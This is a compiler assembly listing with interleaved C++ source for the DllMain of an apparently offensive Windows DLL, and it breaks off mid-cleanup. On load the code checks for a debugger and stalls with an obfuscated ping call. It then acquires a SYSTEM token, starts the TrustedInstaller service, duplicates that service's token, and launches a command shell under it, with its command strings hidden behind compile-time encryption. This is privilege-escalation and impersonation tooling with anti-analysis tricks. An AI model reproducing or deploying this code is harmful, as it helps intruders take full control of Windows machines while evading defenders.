$T2 = 80
obfuscator$3 = 88
obfuscator$4 = 120
obfuscator$5 = 168
$T6 = 192
cmd$7 = 224
wstrCmd$8 = 248
strCmd$9 = 280
si$10 = 320
pi$11 = 432
__$ArrayPad$ = 456
hModule$ = 496
ul_reason_for_call$ = 504
lpReserved$ = 512
DllMain	PROC						; COMDAT

; 33   : {

$LN563:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+16], rsi
	mov	QWORD PTR [rsp+24], rdi
	push	rbp
	push	r12
	push	r14
	lea	rbp, QWORD PTR [rsp-208]
	sub	rsp, 464				; 000001d0H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rbp-256], rax

; 34   : 	switch ( ul_reason_for_call )

	cmp	edx, 1
	jne	$LN436@DllMain

; 35   : 	{
; 36   : 	case DLL_PROCESS_ATTACH:		
; 37   : 		if ( !ProcessUtilities::Init() )

	call	?Init@ProcessUtilities@@YAHXZ		; ProcessUtilities::Init
	test	eax, eax
	je	$LN1@DllMain
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 350  : 	PPEB filePEB = ( PPEB ) GetPebAddress();

	call	GetPebAddress

; 351  : 	BYTE beingDebugged = filePEB->BeingDebugged;
; 352  : 
; 353  : 	if ( beingDebugged ) {

	cmp	BYTE PTR [rax+2], 0
	je	$LN12@DllMain

; 221  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	movdqa	xmm0, XMMWORD PTR __xmm@ae8f341def7b9fc9b49d3413b83bc697
	mov	DWORD PTR obfuscator$3[rsp+16], -379547767 ; e9608f89H
	mov	DWORD PTR obfuscator$3[rsp+20], -1114687990 ; bd8f360aH
	mov	DWORD PTR obfuscator$3[rsp+24], -1289698873 ; b320c1c7H
	mov	WORD PTR obfuscator$3[rsp+28], 9567	; 0000255fH
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?HMFAPKMMCAKKFABJ@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?HMFAPKMMCAKKFABJ@D@ay@@XZ@4V45@A
	add	rbx, rdx
	test	al, 1
	jne	SHORT $LN531@DllMain
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+31], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 221  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	lea	rax, QWORD PTR [rbx+30]
	lea	rcx, QWORD PTR obfuscator$3[rsp+30]
	cmp	rbx, rcx
	ja	SHORT $LN515@DllMain
	lea	rcx, QWORD PTR obfuscator$3[rsp]
	cmp	rax, rcx
	jb	SHORT $LN515@DllMain
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 55   : 		DWORD  pid2  = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));

	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$3[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	eax, DWORD PTR obfuscator$3[rsp+24]
	mov	DWORD PTR [rbx+24], eax
	movzx	eax, WORD PTR obfuscator$3[rsp+28]
	mov	WORD PTR [rbx+28], ax
	mov	BYTE PTR [rbx+30], 175			; 000000afH
	jmp	SHORT $LN541@DllMain
$LN515@DllMain:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 221  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$3[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	eax, DWORD PTR obfuscator$3[rsp+24]
	mov	DWORD PTR [rbx+24], eax
	movzx	eax, WORD PTR obfuscator$3[rsp+28]
	mov	WORD PTR [rbx+28], ax
	mov	BYTE PTR [rbx+30], 175			; 000000afH
$LN541@DllMain:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?HMFAPKMMCAKKFABJ@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN531@DllMain:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 140  : 			decrypt();

	mov	rcx, rbx
	call	?decrypt@?$obfuscated_data@$0BP@$0?HMFAPKMMCAKKFABJ@D@ay@@QEAAXXZ ; ay::obfuscated_data<31,-8957935413468221465,char>::decrypt
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 221  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	mov	rcx, rbx
	call	system
$LN12@DllMain:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 45   : 		HANDLE escalatedPriv = ProcessUtilities::GetSystemToken();

	call	?GetSystemToken@ProcessUtilities@@YAPEAXXZ ; ProcessUtilities::GetSystemToken

; 46   : 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));

	movdqa	xmm0, XMMWORD PTR __xmm@f84b90168c657a50f25b8d0688653364
	movdqa	xmm1, XMMWORD PTR __xmm@ea1fa840ff5c7142b35b8e0c830b3a4a
	mov	DWORD PTR obfuscator$4[rbp-224], -1302829489 ; b258664fH
	mov	WORD PTR obfuscator$4[rbp-220], 58118	; 0000e306H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdi, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdi]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN550@DllMain
	or	eax, 1
	mov	DWORD PTR [rcx+rdi], eax
	lea	rcx, QWORD PTR [rbx+rdi]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+38], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 46   : 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));

	lea	rax, QWORD PTR [rcx+37]
	lea	rdx, QWORD PTR obfuscator$4[rbp-219]
	cmp	rcx, rdx
	ja	SHORT $LN518@DllMain
	lea	rdx, QWORD PTR obfuscator$4[rsp]
	cmp	rax, rdx
	jb	SHORT $LN518@DllMain

; 55   : 		DWORD  pid2  = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));

	movups	XMMWORD PTR [rcx], xmm0
	movups	XMMWORD PTR [rcx+16], xmm1
	mov	eax, DWORD PTR obfuscator$4[rbp-224]
	mov	DWORD PTR [rcx+32], eax
	movzx	eax, WORD PTR obfuscator$4[rbp-220]
	mov	WORD PTR [rcx+36], ax
	jmp	SHORT $LN542@DllMain
$LN518@DllMain:

; 46   : 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));

	movups	XMMWORD PTR [rcx], xmm0
	movups	XMMWORD PTR [rcx+16], xmm1
	mov	eax, DWORD PTR obfuscator$4[rbp-224]
	mov	DWORD PTR [rcx+32], eax
	movzx	eax, WORD PTR obfuscator$4[rbp-220]
	mov	WORD PTR [rcx+36], ax
$LN542@DllMain:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@YAXXZ ; ``DllMain'::`4'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN550@DllMain:
	lea	r11, QWORD PTR [rbx+rdi]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 140  : 			decrypt();

	mov	rcx, r11
	call	?decrypt@?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAXXZ ; ay::obfuscated_data<38,-7115718816596162265,char>::decrypt
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 46   : 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));

	mov	rdx, r11
	lea	rcx, QWORD PTR strCmd$9[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2226 :         value_type* _Result = _Bx._Buf;

	lea	rdx, QWORD PTR strCmd$9[rbp-256]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR strCmd$9[rbp-232], 15

; 2227 :         if (_Large_mode_engaged()) {

	cmova	rdx, QWORD PTR strCmd$9[rbp-256]

; 3967 :         return iterator(

	mov	r14, QWORD PTR strCmd$9[rbp-240]
	add	r14, rdx

; 2226 :         value_type* _Result = _Bx._Buf;

	lea	rbx, QWORD PTR strCmd$9[rbp-256]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR strCmd$9[rbp-232], 15

; 2227 :         if (_Large_mode_engaged()) {

	cmova	rbx, QWORD PTR strCmd$9[rbp-256]
	xorps	xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

	movups	XMMWORD PTR wstrCmd$8[rbp-256], xmm0

; 2594 :         if (_UFirst == _ULast) {

	mov	r12, 9223372036854775807		; 7fffffffffffffffH
	xor	edi, edi
	mov	QWORD PTR wstrCmd$8[rbp-240], rdi
	cmp	rbx, r14
	jne	SHORT $LN71@DllMain

; 2651 :         _My_data._Mysize = 0;

	mov	r8d, edi

; 2652 :         _My_data._Myres  = _Small_string_capacity;

	mov	edx, 7
	mov	QWORD PTR wstrCmd$8[rbp-232], rdx

; 2653 :         _My_data._Activate_SSO_buffer();
; 2654 : 
; 2655 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2656 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	WORD PTR wstrCmd$8[rbp-256], di

; 2596 :         } else {

	jmp	$LN168@DllMain
$LN71@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 1571 :         return _Last - _First; // assume the iterator will do debug checking

	sub	r14, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2737 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR wstrCmd$8[rbp-232], 7

; 2738 : 
; 2739 :         if constexpr (is_same_v<_Size, size_type>) {
; 2740 :             if (_Count > max_size()) {

	mov	rax, 9223372036854775806		; 7ffffffffffffffeH
	cmp	r14, rax
	ja	$LN558@DllMain

; 2742 :             }
; 2743 : 
; 2744 :             if (_Count > _Small_string_capacity) {

	mov	esi, 7
	cmp	r14, rsi
	jbe	$LN554@DllMain

; 4763 :         const size_type _Masked = _Requested | _Alloc_mask;

	mov	rsi, r14
	or	rsi, 7
	cmp	rsi, rax

; 4764 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	jbe	SHORT $LN100@DllMain

; 4765 :             return _Max;

	mov	rsi, rax
	lea	rcx, QWORD PTR [r12+r12]
$LN122@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN124@DllMain

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	$LN552@DllMain

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	$LN410@DllMain

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2747 :                 _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	QWORD PTR wstrCmd$8[rbp-256], rax

; 2748 :                 _My_data._Myres = _New_capacity;

	mov	QWORD PTR wstrCmd$8[rbp-232], rsi
	jmp	SHORT $LN93@DllMain
$LN100@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	mov	eax, 10
	cmp	rsi, rax
	cmovb	rsi, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2616 :         ++_Capacity; // Take null terminator into consideration

	lea	rcx, QWORD PTR [rsi+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	cmp	rcx, r12
	ja	$LN552@DllMain

; 89   :     return _Count * _Ty_size;

	add	rcx, rcx

; 196  :     if (_Bytes == 0) {

	jne	SHORT $LN122@DllMain

; 197  :         return nullptr;

	mov	rax, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2747 :                 _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	QWORD PTR wstrCmd$8[rbp-256], rax

; 2748 :                 _My_data._Myres = _New_capacity;

	mov	QWORD PTR wstrCmd$8[rbp-232], rsi
	jmp	SHORT $LN93@DllMain
$LN124@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2747 :                 _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	QWORD PTR wstrCmd$8[rbp-256], rax

; 2748 :                 _My_data._Myres = _New_capacity;

	mov	QWORD PTR wstrCmd$8[rbp-232], rsi
	jmp	SHORT $LN93@DllMain
$LN554@DllMain:

; 2742 :             }
; 2743 : 
; 2744 :             if (_Count > _Small_string_capacity) {

	mov	rax, QWORD PTR wstrCmd$8[rbp-256]
$LN93@DllMain:

; 2226 :         value_type* _Result = _Bx._Buf;

	lea	r8, QWORD PTR wstrCmd$8[rbp-256]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	rsi, 7

; 2227 :         if (_Large_mode_engaged()) {

	cmova	r8, rax

; 2759 :             _STD _Copy_n_unchecked4(_STD move(_First), _Count, _Data);

	mov	rcx, r8
	mov	rdx, r14
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4671 :     for (; _Count != 0; ++_Dest, (void) ++_First, --_Count) {

	test	r14, r14
	je	SHORT $LN159@DllMain
$LL160@DllMain:

; 4672 :         *_Dest = *_First;

	movsx	eax, BYTE PTR [rbx]
	mov	WORD PTR [rcx], ax

; 4671 :     for (; _Count != 0; ++_Dest, (void) ++_First, --_Count) {

	lea	rcx, QWORD PTR [rcx+2]
	lea	rbx, QWORD PTR [rbx+1]
	sub	rdx, 1
	jne	SHORT $LL160@DllMain
$LN159@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2760 :             _My_data._Mysize = _Count;

	mov	QWORD PTR wstrCmd$8[rbp-240], r14

; 2761 :             _Data[_Count]    = _Elem();

	mov	WORD PTR [r8+r14*2], di
	mov	rdx, QWORD PTR wstrCmd$8[rbp-232]
	mov	r8, QWORD PTR wstrCmd$8[rbp-240]
$LN168@DllMain:
	xorps	xmm0, xmm0

; 2226 :         value_type* _Result = _Bx._Buf;

	lea	rax, QWORD PTR wstrCmd$8[rbp-256]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	rdx, 7

; 2227 :         if (_Large_mode_engaged()) {

	cmova	rax, QWORD PTR wstrCmd$8[rbp-256]

; 3967 :         return iterator(

	lea	rsi, QWORD PTR [rax+r8*2]

; 2226 :         value_type* _Result = _Bx._Buf;

	lea	r14, QWORD PTR wstrCmd$8[rbp-256]

; 2227 :         if (_Large_mode_engaged()) {

	cmova	r14, QWORD PTR wstrCmd$8[rbp-256]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	movdqu	XMMWORD PTR cmd$7[rbp-256], xmm0
	mov	rax, rdi
	mov	QWORD PTR cmd$7[rbp-240], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 1571 :         return _Last - _First; // assume the iterator will do debug checking

	mov	rbx, rsi
	sub	rbx, r14
	sar	rbx, 1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2069 :         if (_Count != 0) {

	je	SHORT $LN555@DllMain

; 2010 :         if (_Newcapacity > max_size()) {

	cmp	rbx, r12
	ja	$LN559@DllMain
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 89   :     return _Count * _Ty_size;

	add	rbx, rbx

; 196  :     if (_Bytes == 0) {

	je	SHORT $LN262@DllMain

; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rbx, 4096				; 00001000H
	jb	SHORT $LN265@DllMain

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [rbx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, rbx
	jbe	$LN560@DllMain

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	$LN374@DllMain

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN262@DllMain
$LN265@DllMain:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rbx
	call	??2@YAPEAX_K@Z				; operator new
$LN262@DllMain:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1994 :         _Myfirst              = _Newvec;

	mov	QWORD PTR cmd$7[rbp-256], rax

; 1995 :         _Mylast               = _Newvec;

	mov	QWORD PTR cmd$7[rbp-248], rax

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	add	rbx, rax
	mov	QWORD PTR cmd$7[rbp-240], rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	sub	rsi, r14

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	r8, rsi
	mov	rdx, r14
	mov	rcx, rax
	call	memmove
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2078 :                 _My_data._Mylast = _STD _Uninitialized_copy(_STD forward<_Valty>(_Val)..., _My_data._Myfirst, _Al);

	mov	QWORD PTR cmd$7[rbp-248], rbx

; 2069 :         if (_Count != 0) {

	mov	rax, QWORD PTR cmd$7[rbp-240]
	jmp	SHORT $LN311@DllMain
$LN555@DllMain:
	mov	rbx, QWORD PTR cmd$7[rbp-248]
$LN311@DllMain:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 50   : 		cmd.push_back(L'\0');

	mov	WORD PTR $T2[rsp], di
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 775  :         if (_Mylast != _My_data._Myend) {

	cmp	rbx, rax
	je	SHORT $LN339@DllMain

; 791  :             _Construct_in_place(*_Mylast, _STD forward<_Valty>(_Val)...);

	mov	WORD PTR [rbx], di

; 792  :         } else {
; 793  :             _ASAN_VECTOR_EXTEND_GUARD(static_cast<size_type>(_Mylast - _My_data._Myfirst) + 1);
; 794  :             _Alty_traits::construct(_Getal(), _Unfancy(_Mylast), _STD forward<_Valty>(_Val)...);
; 795  :             _ASAN_VECTOR_RELEASE_GUARD;
; 796  :         }
; 797  : 
; 798  :         _Orphan_range(_Mylast, _Mylast);
; 799  :         _Ty& _Result = *_Mylast;
; 800  :         ++_Mylast;

	add	QWORD PTR cmd$7[rbp-248], 2

; 776  :             return _Emplace_back_with_unused_capacity(_STD forward<_Valty>(_Val)...);

	jmp	SHORT $LN338@DllMain
$LN339@DllMain:

; 777  :         }
; 778  : 
; 779  :         return *_Emplace_reallocate(_Mylast, _STD forward<_Valty>(_Val)...);

	lea	r8, QWORD PTR $T2[rsp]
	mov	rdx, rbx
	lea	rcx, QWORD PTR cmd$7[rbp-256]
	call	??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t>
$LN338@DllMain:
	xorps	xmm0, xmm0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 52   : 		STARTUPINFO si = { 0 };																																			

	xor	eax, eax
	movups	XMMWORD PTR si$10[rbp-256], xmm0
	movups	XMMWORD PTR si$10[rbp-240], xmm0
	movups	XMMWORD PTR si$10[rbp-224], xmm0
	movups	XMMWORD PTR si$10[rbp-208], xmm0
	movups	XMMWORD PTR si$10[rbp-192], xmm0
	movups	XMMWORD PTR si$10[rbp-176], xmm0
	mov	QWORD PTR si$10[rbp-160], rax

; 55   : 		DWORD  pid2  = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));

	movdqa	xmm0, XMMWORD PTR __xmm@bd4045c34225ea7786414cdb5024eb4d
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rsi, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rsi]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN551@DllMain
	or	eax, 1
	mov	DWORD PTR [rcx+rsi], eax
	lea	rax, QWORD PTR [rsi+rbx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rax+17], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 55   : 		DWORD  pid2  = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));

	lea	rcx, QWORD PTR [rax+16]
	lea	rdx, QWORD PTR obfuscator$5[rbp-240]
	cmp	rax, rdx
	ja	SHORT $LN521@DllMain
	lea	rdx, QWORD PTR obfuscator$5[rbp-256]
	cmp	rcx, rdx
	jb	SHORT $LN521@DllMain
	movups	XMMWORD PTR [rax], xmm0
	mov	BYTE PTR [rax+16], 25
	jmp	SHORT $LN543@DllMain
$LN521@DllMain:
	movups	XMMWORD PTR [rax], xmm0
	mov	BYTE PTR [rax+16], 25
$LN543@DllMain:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@YAXXZ ; ``DllMain'::`4'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN551@DllMain:
	lea	r11, QWORD PTR [rbx+rsi]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 140  : 			decrypt();

	mov	rcx, r11
	call	?decrypt@?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAXXZ ; ay::obfuscated_data<17,-3520361701531608807,char>::decrypt
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp

; 55   : 		DWORD  pid2  = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));

	mov	rdx, r11
	lea	rcx, QWORD PTR $T6[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rcx, rax
	call	?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::StartWindowsService

; 56   : 		HANDLE token = ProcessUtilities::CreateProcessAccessToken(pid2);

	mov	ecx, eax
	call	?CreateProcessAccessToken@ProcessUtilities@@YAPEAXK@Z ; ProcessUtilities::CreateProcessAccessToken

; 57   : 
; 58   : 		ProcessUtilities::OpenProcessAsImposter(

	lea	rcx, QWORD PTR pi$11[rbp-256]
	mov	QWORD PTR [rsp+64], rcx
	lea	rcx, QWORD PTR si$10[rbp-256]
	mov	QWORD PTR [rsp+56], rcx
	mov	r9, QWORD PTR cmd$7[rbp-256]
	mov	rcx, rax
	call	?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z ; ProcessUtilities::OpenProcessAsImposter

; 59   : 			token,
; 60   : 			LOGON_WITH_PROFILE,
; 61   : 			NULL,
; 62   : 			cmd.data(),
; 63   : 			CREATE_NEW_CONSOLE,
; 64   : 			NULL,
; 65   : 			NULL,
; 66   : 			&si,
; 67   : 			&pi
; 68   : 		);
; 69   : 
; 70   : 		ProcessUtilities::Clean();

	call	?Clean@ProcessUtilities@@YAHXZ		; ProcessUtilities::Clean
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2048 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rcx, QWORD PTR cmd$7[rbp-256]
	test	rcx, rcx
	je	SHORT $LN358@DllMain

; 2049 :             _STD _Destroy_range(_Myfirst, _Mylast, _Al);
; 2050 :             _ASAN_VECTOR_REMOVE;
; 2051 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rax, QWORD PTR cmd$7[rbp-240]
	sub	rax, rcx
	sar	rax, 1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	lea	rdx, QWORD PTR [rax+rax]
	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN377@DllMain

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	sub	rax, rcx

